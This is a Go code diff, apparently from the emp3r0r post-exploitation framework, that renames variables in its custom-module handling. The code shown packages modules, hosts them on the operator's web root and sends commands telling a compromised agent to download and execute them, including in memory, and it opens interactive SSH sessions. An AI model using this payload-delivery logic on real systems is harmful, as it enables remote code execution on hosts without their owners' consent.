@@ -28,9 +28,9 @@ var ModuleNames = make(map[string]string)
 
 // moduleCustom run a custom module
 func moduleCustom() {
-	config, exists := ModuleConfigs[CurrentMod]
+	config, exists := ModuleConfigs[ActiveModule]
 	if !exists {
-		LogError("Config of %s does not exist", CurrentMod)
+		LogError("Config of %s does not exist", ActiveModule)
 		return
 	}
 
@@ -84,7 +84,7 @@ func build_module(config *emp3r0r_def.ModuleConfig) (out []byte, err error) {
 	}
 	defer os.Chdir(EmpWorkSpace)
 
-	for _, opt := range CurrentModuleOptions {
+	for _, opt := range AvailableModuleOptions {
 		if opt == nil {
 			continue
 		}
@@ -105,7 +105,7 @@ func build_module(config *emp3r0r_def.ModuleConfig) (out []byte, err error) {
 
 func updateModuleOptions(config *emp3r0r_def.ModuleConfig) {
 	for opt, modOption := range config.Options {
-		option, ok := CurrentModuleOptions[opt]
+		option, ok := AvailableModuleOptions[opt]
 		if !ok {
 			LogError("Option '%s' not found", opt)
 			return
@@ -115,7 +115,7 @@ func updateModuleOptions(config *emp3r0r_def.ModuleConfig) {
 }
 
 func getDownloadAddr() string {
-	download_url_opt, ok := CurrentModuleOptions["download_addr"]
+	download_url_opt, ok := AvailableModuleOptions["download_addr"]
 	if ok {
 		return download_url_opt.Val
 	}
@@ -123,8 +123,8 @@ func getDownloadAddr() string {
 }
 
 func handleInMemoryModule(config emp3r0r_def.ModuleConfig, payload_type, download_addr string) {
-	hosted_file := WWWRoot + CurrentMod + ".xz"
-	LogInfo("Compressing %s with xz...", CurrentMod)
+	hosted_file := WWWRoot + ActiveModule + ".xz"
+	LogInfo("Compressing %s with xz...", ActiveModule)
 	path := fmt.Sprintf("%s/%s", config.Path, config.AgentConfig.Exec)
 	data, err := os.ReadFile(path)
 	if err != nil {
@@ -136,35 +136,35 @@ func handleInMemoryModule(config emp3r0r_def.ModuleConfig, payload_type, downloa
 		LogError("Compressing %s: %v", path, err)
 		return
 	}
-	LogInfo("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, CurrentMod)
+	LogInfo("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, ActiveModule)
 	err = os.WriteFile(hosted_file, compressedBytes, 0o600)
 	if err != nil {
 		LogError("Writing %s: %v", hosted_file, err)
 		return
 	}
 	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s",
-		emp3r0r_def.C2CmdCustomModule, CurrentMod, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
+		emp3r0r_def.C2CmdCustomModule, ActiveModule, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
 	cmd_id := uuid.NewString()
-	LogDebug("Sending command %s to %s", cmd, CurrentTarget.Tag)
+	LogDebug("Sending command %s to %s", cmd, ActiveAgent.Tag)
 	err = SendCmdToCurrentTarget(cmd, cmd_id)
 	if err != nil {
-		LogError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+		LogError("Sending command %s to %s: %v", cmd, ActiveAgent.Tag, err)
 	}
 }
 
 func handleCompressedModule(config emp3r0r_def.ModuleConfig, payload_type, exec_cmd, envStr, download_addr string) {
-	tarball_path := WWWRoot + CurrentMod + ".tar.xz"
+	tarball_path := WWWRoot + ActiveModule + ".tar.xz"
 	file_to_download := filepath.Base(tarball_path)
 	if !util.IsFileExist(tarball_path) {
-		LogInfo("Compressing %s with tar.xz...", CurrentMod)
+		LogInfo("Compressing %s with tar.xz...", ActiveModule)
 		path := config.Path
 		err := util.TarXZ(path, tarball_path)
 		if err != nil {
-			LogError("Compressing %s: %v", CurrentMod, err)
+			LogError("Compressing %s: %v", ActiveModule, err)
 			return
 		}
 		LogInfo("Created %.4fMB archive (%s) for module '%s'",
-			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, CurrentMod)
+			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, ActiveModule)
 	} else {
 		LogInfo("Using cached %s", tarball_path)
 	}
@@ -172,11 +172,11 @@ func handleCompressedModule(config emp3r0r_def.ModuleConfig, payload_type, exec_
 	checksum := tun.SHA256SumFile(tarball_path)
 	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --type %s --file_to_download %s --exec \"%s\"",
 		emp3r0r_def.C2CmdCustomModule,
-		CurrentMod, checksum, envStr, download_addr, payload_type, file_to_download, exec_cmd)
+		ActiveModule, checksum, envStr, download_addr, payload_type, file_to_download, exec_cmd)
 	cmd_id := uuid.NewString()
 	err := SendCmdToCurrentTarget(cmd, cmd_id)
 	if err != nil {
-		LogError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+		LogError("Sending command %s to %s: %v", cmd, ActiveAgent.Tag, err)
 	}
 
 	if config.AgentConfig.IsInteractive {
@@ -211,7 +211,7 @@ func handleInteractiveModule(config emp3r0r_def.ModuleConfig, cmd_id string) {
 	}()
 
 	sshErr := SSHClient(fmt.Sprintf("%s/%s/%s",
-		RuntimeConfig.AgentRoot, CurrentMod, config.AgentConfig.Exec),
+		RuntimeConfig.AgentRoot, ActiveModule, config.AgentConfig.Exec),
 		args, port, false)
 	if sshErr != nil {
 		LogError("module %s: %v", config.Name, sshErr)
